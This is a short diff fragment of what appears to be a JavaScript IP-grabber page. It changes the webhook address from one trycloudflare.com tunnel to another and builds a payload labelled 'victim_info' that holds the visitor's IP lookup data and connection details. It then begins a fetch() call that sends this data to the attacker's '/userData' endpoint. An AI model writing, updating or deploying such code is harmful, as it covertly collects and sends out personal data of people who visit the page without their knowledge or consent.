@@ -85,7 +85,7 @@ Connection Type: ${connectionType}
 Loading Time: ${loadTime}
                 `;
 
-                const webhookURL = "https://purchase-partnership-epson-assist.trycloudflare.com/userData";
+                const webhookURL = "https://sticker-info-flows-goods.trycloudflare.com/userData";
 
                 const payload = {'victim_info': ipinfo}; 
                 fetch(webhookURL, {
